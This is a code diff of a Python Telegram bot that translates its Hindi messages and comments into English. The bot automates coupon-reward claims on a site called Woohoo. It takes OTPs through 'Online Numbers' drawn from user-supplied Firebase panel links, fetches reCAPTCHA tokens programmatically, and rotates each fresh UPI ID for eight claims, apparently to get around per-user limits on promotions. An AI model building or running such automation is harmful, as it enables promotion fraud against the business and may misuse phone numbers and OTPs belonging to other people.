+                "🚀 New session initialized.\nPlease enter your 10-digit mobile number:",
                 reply_markup=get_cancel_to_claim_keyboard(),
             )
             return WAITING_FOR_DIRECT_MOBILE_FLOW
 
     elif data == "fb_next_triplet":
-        # पिछला कूपन सक्सेसफुली रिडीम हो गया है — उसे कन्फर्म मार्क करें और अगला पेयर दें
         triplets = context.user_data.get("firebase_assigned_triplets", [])
         if triplets:
             triplets[-1]["status"] = "Redeemed"
         return await send_firebase_assigned_triplet(query.message, context)
 
     elif data == "fb_retry_coupon":
-        # अगर कूपन सक्सेसफुली रिडीम नहीं हुआ तो उसे वापस पूल में डालकर नए Online नंबर के साथ दोबारा भेजें
         triplets = context.user_data.get("firebase_assigned_triplets", [])
         failed_coupon = triplets[-1].get("coupon") if triplets else None
         if triplets:
@@ -2112,8 +2224,8 @@ async def claim_inline_callback_handler(update: Update, context: ContextTypes.DE
         returned = release_unredeemed_firebase_coupon(context, failed_coupon)
         if returned:
             await query.message.reply_text(
-                f"♻️ **Coupon `{returned}` रिडीम नहीं हुआ था — इसे दोबारा वापस निकाल लिया गया है!**\n"
-                "🔄 अब नए Online नंबर के साथ दोबारा भेजा जा रहा है...",
+                f"♻️ **Coupon `{returned}` was not redeemed and has been returned to the available pool.**\n"
+                "🔄 Retrying with the next available online number...",
                 parse_mode=ParseMode.MARKDOWN,
             )
         return await send_firebase_assigned_triplet(query.message, context)
@@ -2130,7 +2242,7 @@ async def claim_inline_callback_handler(update: Update, context: ContextTypes.DE
     elif data == "claim_cancel_main":
         await close_user_session(chat_id)
         await query.edit_message_text(
-            text="❌ **Action Cancelled.** Select an option from the main menu below.",
+            text="❌ **Action Cancelled.** Please select an option from the main menu below.",
             parse_mode=ParseMode.MARKDOWN,
         )
         return ConversationHandler.END
@@ -2139,13 +2251,12 @@ async def claim_inline_callback_handler(update: Update, context: ContextTypes.DE
 
 
 async def receive_direct_mobile_flow_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Direct Send Your Mobile Number पर क्लिक करने के बाद Woohoo का पूरा 4-step flow चलाता है।"""
+    """Executes the 4-step direct mobile claim workflow on Woohoo."""
     if not update.message or not update.message.text or update.effective_chat.type != "private":
         return WAITING_FOR_DIRECT_MOBILE_FLOW
 
     text = update.message.text.strip()
 
-    # अगर यूज़र ने नीचे के मेनू बटन दबा दिए हैं, तो सेशन बंद करके उस मेनू पर जाएं
     if text in {"Claim Coupon", "Check Coupon", "Buy Coupon", "Support", "🏆 Leaderboard"}:
         await close_user_session(update.effective_chat.id)
         if text == "Claim Coupon":
@@ -2162,16 +2273,16 @@ async def receive_direct_mobile_flow_input(update: Update, context: ContextTypes
     async with get_user_lock(chat_id):
         session_data = user_sessions.get(chat_id)
         if not session_data:
-            await update.message.reply_text("⏳ Session initialize ho raha hai...")
+            await update.message.reply_text("⏳ Initializing session, please wait...")
             token_ok = await init_user_session(chat_id)
             if not token_ok:
                 await update.message.reply_text(
-                    "⚠️ Website se connect nahi ho pa raha hai. Please Cancel dabakar dobara try karein.",
+                    "⚠️ Unable to connect to the website. Please tap Cancel and try again.",
                     reply_markup=get_cancel_to_claim_keyboard(),
                 )
                 return ConversationHandler.END
             await update.message.reply_text(
-                "Please apna 10-digit mobile number bhejein:",
+                "Please enter your 10-digit mobile number:",
                 reply_markup=get_cancel_to_claim_keyboard(),
             )
             return WAITING_FOR_DIRECT_MOBILE_FLOW
@@ -2180,13 +2291,11 @@ async def receive_direct_mobile_flow_input(update: Update, context: ContextTypes
         current_step = session_data["step"]
         client: UnifiedSessionClient = session_data["client"]
 
-        # ------------------------------------------
-        # STEP 1: मोबाइल नंबर इनपुट और वैलिडेशन
-        # ------------------------------------------
+        # STEP 1: Mobile Number Input & Validation
         if current_step == "AWAITING_MOBILE":
             if not (text.isdigit() and len(text) == 10):
                 await update.message.reply_text(
-                    "❌ Invalid number! Please sahi 10-digit mobile number enter karein:",
+                    "❌ Invalid mobile number. Please enter a valid 10-digit mobile number:",
                     reply_markup=get_cancel_to_claim_keyboard(),
                 )
                 return WAITING_FOR_DIRECT_MOBILE_FLOW
@@ -2194,17 +2303,15 @@ async def receive_direct_mobile_flow_input(update: Update, context: ContextTypes
             session_data["mobile"] = text
             session_data["step"] = "AWAITING_CODE"
             await update.message.reply_text(
-                "✅ Mobile number save ho gaya.\nAb apna unique coupon code bhejein:",
+                "✅ Mobile number saved.\nNow please enter your unique coupon code:",
                 reply_markup=get_cancel_to_claim_keyboard(),
             )
             return WAITING_FOR_DIRECT_MOBILE_FLOW
 
-        # ------------------------------------------
-        # STEP 2: यूनिक कोड इनपुट और API Step 1 कॉल
-        # ------------------------------------------
+        # STEP 2: Coupon Code Input & API Step 1 Call
         elif current_step == "AWAITING_CODE":
             session_data["code"] = text.upper()
-            await update.message.reply_text("⏳ Code verify ho raha hai, please wait...")
+            await update.message.reply_text("⏳ Verifying coupon code, please wait...")
 
             recaptcha_token = await client.get_dynamic_token(action="submit")
 
@@ -2237,15 +2344,15 @@ async def receive_direct_mobile_flow_input(update: Update, context: ContextTypes
 
                 if not res_json.get("error", True):
                     session_data["step"] = "AWAITING_OTP"
-                    server_msg = res_json.get("messageBody") or "OTP bhej diya gaya hai."
+                    server_msg = res_json.get("messageBody") or "OTP has been dispatched."
                     await update.message.reply_text(
-                        f"📩 {server_msg}\nPlease received OTP enter karein:",
+                        f"📩 {server_msg}\nPlease enter the received OTP:",
                         reply_markup=get_cancel_to_claim_keyboard(),
                     )
                 else:
                     error_msg = res_json.get("messageBody") or str(res_json)
                     await update.message.reply_text(
-                        f"❌ Website Error: {error_msg}\nPlease sahi unique code dobara bhejein (ya Cancel dabayein):",
+                        f"❌ Website Error: {error_msg}\nPlease enter a valid coupon code (or tap Cancel):",
                         reply_markup=get_cancel_to_claim_keyboard(),
                     )
                 return WAITING_FOR_DIRECT_MOBILE_FLOW
@@ -2253,23 +2360,21 @@ async def receive_direct_mobile_flow_input(update: Update, context: ContextTypes
             except Exception as e:
                 await close_user_session(chat_id)
                 await update.message.reply_text(
-                    f"⚠️ Network ya API Error: {str(e)}\nDobara start karne ke liye /claim bhejein."
+                    f"⚠️ Network or API Error: {str(e)}\nSend /claim to start a new session."
                 )
                 return ConversationHandler.END
 
-        # ------------------------------------------
-        # STEP 3: OTP वेरिफिकेशन
-        # ------------------------------------------
+        # STEP 3: OTP Verification
         elif current_step == "AWAITING_OTP":
             if not text.isdigit():
                 await update.message.reply_text(
-                    "❌ Invalid OTP! Please sirf digits mein sahi OTP enter karein:",
+                    "❌ Invalid OTP. Please enter digits only:",
                     reply_markup=get_cancel_to_claim_keyboard(),
                 )
                 return WAITING_FOR_DIRECT_MOBILE_FLOW
 
             session_data["otp"] = text
-            await update.message.reply_text("⏳ OTP verify ho raha hai, please wait...")
+            await update.message.reply_text("⏳ Verifying OTP, please wait...")
 
             recaptcha_token = await client.get_dynamic_token(action="submit")
 
@@ -2303,14 +2408,14 @@ async def receive_direct_mobile_flow_input(update: Update, context: ContextTypes
                 if res_2_json.get("error", True):
                     error_msg = res_2_json.get("messageBody") or str(res_2_json)
                     await update.message.reply_text(
-                        f"❌ Website Error: {error_msg}\nPlease sahi OTP dobara enter karein (ya Cancel dabayein):",
+                        f"❌ Website Error: {error_msg}\nPlease re-enter the correct OTP (or tap Cancel):",
                         reply_markup=get_cancel_to_claim_keyboard(),
                     )
                     return WAITING_FOR_DIRECT_MOBILE_FLOW
 
                 session_data["step"] = "AWAITING_UPI"
                 await update.message.reply_text(
-                    "✅ OTP verify ho gaya!\nAb apni UPI ID bhejein (e.g., name@upi):",
+                    "✅ OTP verified successfully!\nNow please enter your UPI ID (e.g., name@upi):",
                     reply_markup=get_cancel_to_claim_keyboard(),
                 )
                 return WAITING_FOR_DIRECT_MOBILE_FLOW
@@ -2318,23 +2423,21 @@ async def receive_direct_mobile_flow_input(update: Update, context: ContextTypes
             except Exception as e:
                 await close_user_session(chat_id)
                 await update.message.reply_text(
-                    f"⚠️ Server Error: {str(e)}\nDobara start karne ke liye /claim bhejein."
+                    f"⚠️ Server Error: {str(e)}\nSend /claim to start a new session."
                 )
                 return ConversationHandler.END
 
-        # ------------------------------------------
-        # STEP 4: UPI ID इनपुट और फाइनल सबमिशन
-        # ------------------------------------------
+        # STEP 4: UPI ID Input & Final Submission
         elif current_step == "AWAITING_UPI":
             if "@" not in text or len(text) < 5:
                 await update.message.reply_text(
-                    "❌ Invalid UPI ID! Please sahi UPI ID enter karein (jisme '@' shamil ho):",
+                    "❌ Invalid UPI ID. Please enter a valid UPI ID containing '@':",
                     reply_markup=get_cancel_to_claim_keyboard(),
                 )
                 return WAITING_FOR_DIRECT_MOBILE_FLOW
 
             session_data["upi_id"] = text
-            await update.message.reply_text("⏳ Final submit ho raha hai, please wait...")
+            await update.message.reply_text("⏳ Submitting final details, please wait...")
 
             recaptcha_token = await client.get_dynamic_token(action="submit")
 
@@ -2369,9 +2472,8 @@ async def receive_direct_mobile_flow_input(update: Update, context: ContextTypes
                     session_data["dynamic_token"] = res_3_json["token"]
 
                 if not res_3_json.get("error", True):
-                    success_msg = res_3_json.get("messageBody") or "Process successfully complete ho gaya!"
+                    success_msg = res_3_json.get("messageBody") or "Process completed successfully!"
 
-                    # Direct Mobile से सफलतापूर्वक क्लेम हुए कूपन को Leaderboard में जोड़ें
                     user_info = _extract_telegram_user_info(update)
                     await record_successful_coupon_claim({
                         "user_id": user_info["user_id"],
@@ -2386,14 +2488,14 @@ async def receive_direct_mobile_flow_input(update: Update, context: ContextTypes
 
                     await update.message.reply_text(
                         f"🎉 {success_msg}\n\n"
-                        "🔄 Naya session start karne ke liye /claim bhejein:"
+                        "🔄 Send /claim to start a new session."
                     )
                     await close_user_session(chat_id)
                     return ConversationHandler.END
                 else:
                     error_msg = res_3_json.get("messageBody") or str(res_3_json)
                     await update.message.reply_text(
-                        f"❌ Website Error: {error_msg}\nPlease sahi UPI ID dobara enter karein (ya Cancel dabayein):",
+                        f"❌ Website Error: {error_msg}\nPlease re-enter a valid UPI ID (or tap Cancel):",
                         reply_markup=get_cancel_to_claim_keyboard(),
                     )
                     return WAITING_FOR_DIRECT_MOBILE_FLOW
@@ -2401,7 +2503,7 @@ async def receive_direct_mobile_flow_input(update: Update, context: ContextTypes
             except Exception as e:
                 await close_user_session(chat_id)
                 await update.message.reply_text(
-                    f"⚠️ Server Error: {str(e)}\nDobara start karne ke liye /claim bhejein."
+                    f"⚠️ Server Error: {str(e)}\nSend /claim to start a new session."
                 )
                 return ConversationHandler.END
 
@@ -2453,8 +2555,8 @@ async def receive_firebase_text_input(update: Update, context: ContextTypes.DEFA
         return WAITING_FOR_FIREBASE_COUPONS
 
     await update.message.reply_text(
-        "⚠️ **कोई Active Firebase Panel नहीं मिला (Inactive)।**\n"
-        "🔄 कृपया दोबारा से अपना **Firebase URL** या **`.txt` / `.zip` file** भेजें:",
+        "⚠️ **No Active Firebase Panel Found.**\n"
+        "🔄 Please send another **Firebase URL** or upload a **`.txt` / `.zip` file**:",
         reply_markup=get_cancel_to_claim_keyboard(),
         parse_mode=ParseMode.MARKDOWN,
     )
@@ -2472,7 +2574,7 @@ async def receive_firebase_file_input(update: Update, context: ContextTypes.DEFA
 
     if not document or not (file_name.endswith(".zip") or file_name.endswith(".txt")):
         await update.message.reply_text(
-            "⚠️ **Invalid File Format:** केवल Firebase/Panel links वाली **`.txt`** या **`.zip`** file ही upload करें, या 20 तक links सीधे paste करें।",
+            "⚠️ **Invalid File Format:** Please upload only a **`.txt`** or **`.zip`** file containing Firebase/Panel links, or paste up to 20 links directly.",
             reply_markup=get_cancel_to_claim_keyboard(),
             parse_mode=ParseMode.MARKDOWN,
         )
@@ -2504,9 +2606,9 @@ async def receive_firebase_file_input(update: Update, context: ContextTypes.DEFA
 
         if not extracted_text.strip():
             empty_msg = (
-                "🚫 **Rejected ZIP:** इस ZIP file के अंदर कोई `.txt` link file नहीं मिली।"
+                "🚫 **Rejected ZIP:** No `.txt` link files were found inside this ZIP archive."
                 if is_zip
-                else "🚫 **Rejected TXT:** यह `.txt` file खाली है।"
+                else "🚫 **Rejected TXT:** The uploaded `.txt` file is empty."
             )
             await status_msg.edit_text(
                 empty_msg,
@@ -2540,8 +2642,8 @@ async def receive_firebase_file_input(update: Update, context: ContextTypes.DEFA
             return WAITING_FOR_FIREBASE_COUPONS
 
         await update.message.reply_text(
-            "⚠️ **कोई Active Firebase Panel नहीं मिला (Inactive)।**\n"
-            "🔄 कृपया दोबारा से अपना **Firebase URL** या **`.txt` / `.zip` file** भेजें:",
+            "⚠️ **No Active Firebase Panel Found.**\n"
+            "🔄 Please send another **Firebase URL** or upload a **`.txt` / `.zip` file**:",
             reply_markup=get_cancel_to_claim_keyboard(),
             parse_mode=ParseMode.MARKDOWN,
         )
@@ -2549,7 +2651,7 @@ async def receive_firebase_file_input(update: Update, context: ContextTypes.DEFA
 
     except zipfile.BadZipFile:
         await status_msg.edit_text(
-            "❌ **Error:** यह एक valid ZIP file नहीं है (corrupted file)।",
+            "❌ **Error:** The uploaded file is not a valid or uncorrupted ZIP archive.",
             reply_markup=get_cancel_to_claim_keyboard(),
             parse_mode=ParseMode.MARKDOWN,
         )
@@ -2568,7 +2670,7 @@ async def receive_firebase_file_input(update: Update, context: ContextTypes.DEFA
 
 
 async def receive_firebase_coupons_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Active Firebase Panel मिलने के बाद यूज़र द्वारा भेजे गए Single या Sequence Coupon Codes को सेव करता है और Fresh UPI ID मांगता है।"""
+    """Saves single or batch coupon codes submitted by the user and prompts for a fresh UPI ID."""
     user_text = update.message.text.strip()
 
     if user_text in {"Claim Coupon", "Check Coupon", "Buy Coupon", "Support", "🏆 Leaderboard"}:
@@ -2586,8 +2688,8 @@ async def receive_firebase_coupons_text(update: Update, context: ContextTypes.DE
     coupons = extract_coupon_codes_from_text(user_text)
     if not coupons:
         await update.message.reply_text(
-            "❌ **कोई Valid Coupon Code नहीं मिला!**\n"
-            "कृपया अपना coupon code (single या sequence में) या `.txt` file भेजें:",
+            "❌ **No Valid Coupon Codes Found!**\n"
+            "Please enter valid coupon codes (single or batch) or upload a `.txt` file:",
             reply_markup=get_cancel_to_claim_keyboard(),
             parse_mode=ParseMode.MARKDOWN,
         )
@@ -2605,7 +2707,7 @@ async def receive_firebase_coupons_text(update: Update, context: ContextTypes.DE
 
 
 async def receive_firebase_coupons_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Active Firebase Panel मिलने के बाद यूज़र द्वारा भेजी गई .txt फाइल से Coupon Codes निकालता है और Fresh UPI ID मांगता है।"""
+    """Extracts coupon codes from an uploaded .txt file and prompts for a fresh UPI ID."""
     if not await ensure_user_subscribed(update, context):
         return ConversationHandler.END
 
@@ -2616,7 +2718,7 @@ async def receive_firebase_coupons_file(update: Update, context: ContextTypes.DE
 
     if not document or not file_name.endswith(".txt"):
         await update.message.reply_text(
-            "⚠️ **Invalid File Format:** कृपया केवल Coupon Codes वाली **`.txt`** file ही भेजें, या सीधे टेक्स्ट में कूपन पेस्ट करें।",
+            "⚠️ **Invalid File Format:** Please upload only a **`.txt`** file containing coupon codes, or paste them directly in text.",
             reply_markup=get_cancel_to_claim_keyboard(),
             parse_mode=ParseMode.MARKDOWN,
         )
@@ -2634,7 +2736,7 @@ async def receive_firebase_coupons_file(update: Update, context: ContextTypes.DE
         coupons = extract_coupon_codes_from_text(extracted_text)
         if not coupons:
             await update.message.reply_text(
-                "🚫 **Rejected TXT:** इस `.txt` file में कोई भी valid coupon code नहीं मिला। कृपया सही `.txt` file भेजें:",
+                "🚫 **Rejected TXT:** No valid coupon codes were found in this `.txt` file. Please upload a valid file:",
                 reply_markup=get_cancel_to_claim_keyboard(),
                 parse_mode=ParseMode.MARKDOWN,
             )
@@ -2665,10 +2767,8 @@ async def receive_firebase_coupons_file(update: Update, context: ContextTypes.DE
 
 async def send_firebase_assigned_triplet(message_target, context: ContextTypes.DEFAULT_TYPE) -> int:
     """
-    Active Firebase के केवल Online सेशन से Online Number + भेजे हुए कूपन्स में से 1 unused कूपन +
-    8 बार यूज़ होने वाली UPI ID का पेयर बनाकर सीधे Woohoo पर ऑटो-क्लेम चलाता है:
-    - हर कूपन क्लेम होने पर A-to-Z पूरी डिटेल का लॉग यूज़र को भेजता है और Leaderboard में काउंट जोड़ता है
-    - पूरा 8 बार या सभी कूपन्स कंप्लीट होने पर फाइनल Reward + /pnlclaim रीस्टार्ट मैसेज भेजता है।
+    Pairs an Online Number from Active Firebase panels with 1 unused coupon and
+    the 8-use UPI ID, runs the automated Woohoo claim workflow, and sends the A-to-Z log.
     """
     upi_cfg = context.user_data.get("firebase_upi_config")
     if not upi_cfg or upi_cfg.get("remaining_uses", 0) <= 0:
@@ -2679,7 +2779,6 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
         )
         return WAITING_FOR_FIREBASE_UPI
 
-    # 1. पहले चेक करें कि कोई unused coupon बचा है या नहीं
     all_coupons: list[str] = context.user_data.get("firebase_coupons", [])
     used_coupons: list[str] = context.user_data.setdefault("used_firebase_coupons", [])
     remaining_coupons = [c for c in all_coupons if c not in used_coupons]
@@ -2688,7 +2787,6 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
         await message_target.reply_text(FINAL_PNL_BATCH_COMPLETE_TEXT)
         return ConversationHandler.END
 
-    # 2. 1 unused coupon पिक करें (इसे तब तक लॉक रखेंगे जब तक क्लेम न हो जाए)
     coupon_info = pick_unused_firebase_coupon(context)
     locked_coupon = coupon_info["coupon"]
     saved_upi_id = upi_cfg["upi_id"]
@@ -2696,12 +2794,11 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
     wait_msg = await message_target.reply_text(
         f"⏳ **Auto-Claim Process Started...**\n"
         f"🎟️ **Coupon Code :** `{locked_coupon}` *(Locked until claimed)*\n"
-        f"💳 **Reserved UPI:** `{saved_upi_id}` *(Step 3 पर ऑटो-सबमिट होगी)*\n\n"
-        "🔄 *Active Firebase के Online Numbers पर OTP भेजकर वेरिफाई किया जा रहा है...*",
+        f"💳 **Reserved UPI:** `{saved_upi_id}` *(Auto-submitted at Step 3)*\n\n"
+        "🔄 *Dispatching OTP to active online numbers and verifying via Firebase...*",
         parse_mode=ParseMode.MARKDOWN,
     )
 
-    # 3. Online Number + Coupon का पेयर बनाकर Woohoo पर OTP -> Verify -> UPI Auto-Claim चलाएं
     claim_result = await auto_claim_triplet_on_woohoo(
         context=context,
         coupon_code=locked_coupon,
@@ -2711,13 +2808,12 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
     await wait_msg.delete()
 
     if not claim_result.get("success"):
-        # यदि कूपन इनवैलिड नहीं है (सिर्फ नंबरों पर OTP नहीं मिला), तो उसी कूपन को वापस उपलब्ध रखें
         if claim_result.get("reason") != "COUPON_INVALID":
             release_unredeemed_firebase_coupon(context, locked_coupon)
             await message_target.reply_text(
-                f"⚠️ **Auto-Claim Complete नहीं हो पाया (Coupon `{locked_coupon}` सुरक्षित रखा गया है):**\n"
-                f"📌 कारण: `{claim_result.get('message')}`\n\n"
-                "🔄 कृपया नए **Active Firebase URL** या **`.txt` / `.zip` file** भेजें ताकि इसी कूपन को दोबारा चलाया जा सके:",
+                f"⚠️ **Auto-Claim Incomplete (Coupon `{locked_coupon}` has been safely preserved):**\n"
+                f"📌 Reason: `{claim_result.get('message')}`\n\n"
+                "🔄 Please send new **Active Firebase URLs** or a **`.txt` / `.zip` file** to retry this coupon:",
                 reply_markup=get_cancel_to_claim_keyboard(),
                 parse_mode=ParseMode.MARKDOWN,
             )
@@ -2726,15 +2822,14 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
             await message_target.reply_text(
                 f"❌ **Coupon Invalid / Already Used:** `{locked_coupon}`\n"
                 f"📌 {claim_result.get('message')}\n\n"
-                "👇 *अगला कूपन चलाने के लिए नीचे बटन दबाएं:*",
+                "👇 *Tap below to proceed with the next available coupon:*",
                 reply_markup=get_firebase_triplet_keyboard(),
                 parse_mode=ParseMode.MARKDOWN,
             )
             return WAITING_FOR_FIREBASE_UPI
 
-    # 4. कूपन सक्सेसफुली क्लेम हो गया है — अब 8-बार वाली UPI ID का 1 स्लॉट कंज्यूम करें
     upi_slot = consume_firebase_upi_use(context)
-    server_msg = claim_result.get("server_message") or "Thank you for submitting the details. Reward will be transferred to provided UPI account within 48hrs."
+    server_msg = claim_result.get("server_message") or "Thank you for submitting the details. Reward will be transferred to the provided UPI account within 48 hours."
     claimed_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     triplet_entry = {
@@ -2750,7 +2845,6 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
     }
     context.user_data.setdefault("firebase_assigned_triplets", []).append(triplet_entry)
 
-    # Firebase से सफलतापूर्वक क्लेम हुए कूपन को भी Leaderboard में जोड़ें
     user_info = context.user_data.get("telegram_user_info") or {
         "user_id": message_target.chat.id if getattr(message_target, "chat", None) else 0,
         "user_name": (
@@ -2769,7 +2863,6 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
         "timestamp": claimed_timestamp,
     })
 
-    # A-to-Z पूरी डिटेल का लॉग यूज़र को भेजें
     atoz_log_msg = build_atoz_claim_log_text(
         triplet_entry=triplet_entry,
         upi_slot=upi_slot,
@@ -2777,7 +2870,6 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
         server_message=server_msg,
     )
 
-    # 5. यदि पूरे 8 बार कंप्लीट हो गए हैं या भेजे गए सारे कूपन्स क्लेम हो चुके हैं
     if upi_slot["needs_new_upi"] or coupon_info["remaining_total"] == 0:
         await message_target.reply_text(
             atoz_log_msg,
@@ -2787,7 +2879,6 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
         await message_target.reply_text(FINAL_PNL_BATCH_COMPLETE_TEXT)
         return ConversationHandler.END
 
-    # अभी और कूपन्स व UPI स्लॉट बाकी हैं
     await message_target.reply_text(
         atoz_log_msg,
         reply_markup=get_firebase_triplet_keyboard(),
@@ -2799,8 +2890,8 @@ async def send_firebase_assigned_triplet(message_target, context: ContextTypes.D
 
 async def receive_firebase_fresh_upi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """
-    यूज़र द्वारा भेजी गई एकदम Fresh UPI ID का फॉर्मेट व डुप्लीकेट चेक करता है,
-    ठीक 8 बार लगातार यूज़ होने के लिए सेव करता है, और तुरंत पहला पेयर (Online Number + Coupon + UPI) भेजता है।
+    Validates the user's fresh UPI ID (format and uniqueness), locks it for 8 consecutive
+    uses, and immediately triggers the first Online Number + Coupon + UPI claim.
     """
     if not update.message or not update.message.text:
         return WAITING_FOR_FIREBASE_UPI
@@ -2819,17 +2910,15 @@ async def receive_firebase_fresh_upi(update: Update, context: ContextTypes.DEFAU
 
     context.user_data["telegram_user_info"] = _extract_telegram_user_info(update)
 
-    # 1. Strict UPI Format Check
     if not is_valid_upi_format(upi_text):
         await update.message.reply_text(
-            "❌ **Invalid UPI Format!**\n"
-            "कृपया सही फॉर्मेट में एकदम **Fresh UPI ID** भेजें (e.g., `rahul123@ybl`, `name@okaxis`):",
+            "❌ **Invalid UPI Format**\n"
+            "Please enter a valid **Fresh UPI ID** (e.g., `rahul123@ybl`, `name@okaxis`):",
             reply_markup=get_cancel_to_claim_keyboard(),
             parse_mode=ParseMode.MARKDOWN,
         )
         return WAITING_FOR_FIREBASE_UPI
 
-    # 2. Duplicate UPI ID Check (पहले से यूज़ हो चुकी या सेव्ड UPI दोबारा नहीं लेगा)
     normalized_upi = upi_text.lower()
     used_upis: list[str] = context.user_data.setdefault("used_firebase_upis", [])
     current_cfg = context.user_data.get("firebase_upi_config")
@@ -2838,15 +2927,14 @@ async def receive_firebase_fresh_upi(update: Update, context: ContextTypes.DEFAU
         current_cfg and current_cfg.get("upi_id", "").lower() == normalized_upi
     ):
         await update.message.reply_text(
-            "🚫 **Duplicate UPI ID Rejected!**\n"
-            f"`{upi_text}` पहले ही यूज़/एंटर की जा चुकी है।\n"
-            "🔄 कृपया एक **एकदम नई Fresh UPI ID** भेजें:",
+            "🚫 **Duplicate UPI ID Rejected**\n"
+            f"`{upi_text}` has already been used.\n"
+            "🔄 Please enter a **new, unused Fresh UPI ID**:",
             reply_markup=get_cancel_to_claim_keyboard(),
             parse_mode=ParseMode.MARKDOWN,
         )
         return WAITING_FOR_FIREBASE_UPI
 
-    # 3. UPI ID को डुप्लीकेट लिस्ट में लॉक करें और ठीक 8 बार सेम रहने के लिए सेट करें
     used_upis.append(normalized_upi)
 
     upi_history: list[dict] = context.user_data.setdefault("firebase_upi_history", [])
@@ -2866,7 +2954,6 @@ async def receive_firebase_fresh_upi(update: Update, context: ContextTypes.DEFAU
     context.user_data["firebase_upi_config"] = new_upi_config
     upi_history.append(new_upi_config)
 
-    # 4. तुरंत 1 Online Number + 1 Unused Coupon + 1 UPI Use का सेट बनाकर ऑटो-क्लेम चलाएं
     return await send_firebase_assigned_triplet(update.message, context)
 
 
